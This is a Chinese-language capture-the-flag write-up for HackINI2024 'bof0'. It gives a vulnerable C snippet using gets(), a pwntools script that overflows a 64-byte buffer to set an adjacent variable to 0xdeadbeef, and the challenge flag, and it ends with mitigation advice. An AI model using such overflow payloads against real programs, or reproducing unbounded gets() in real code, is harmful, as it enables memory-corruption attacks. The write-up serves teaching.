# HackINI2024 bof0

## 题目简述

题目提供一个关闭栈保护和 PIE 的 32 位程序。`vuln()` 使用 `gets()` 向 64 字节栈缓冲区读取数据，缓冲区后方有一个初值为 0 的整数；只要把该整数覆盖为 `0xdeadbeef`，程序就会调用 `get_flag()`。

## 解题过程

漏洞代码为：

```c
char buf[64];
int a = 0;

gets(buf);
if (a == 0xdeadbeef) {
    get_flag();
}
```

根据题目二进制的实际栈布局，`a` 紧接在 64 字节缓冲区后。目标为 32 位小端程序，因此将 `0xdeadbeef` 按小端序追加到 64 字节填充后即可：

```python
from pwn import *

io = process("./chall")
payload = b"A" * 64 + p32(0xDEADBEEF)
io.sendlineafter(b"Enter your name: ", payload)
print(io.recvall().decode())
```

程序进入 `get_flag()`，读取并输出：

```text
shellmates{WElC0me_to_PWn_w3LCoM3_t0_BOf}
```

## 方法总结

这是最基础的栈变量覆盖：目标不是劫持返回地址，而是修改相邻的控制变量。分析时应先确认架构、字节序和变量偏移，再按目标宽度打包数值。根本漏洞是无边界的 `gets()`；应改用带长度限制的输入函数，并启用栈保护等编译期防护。
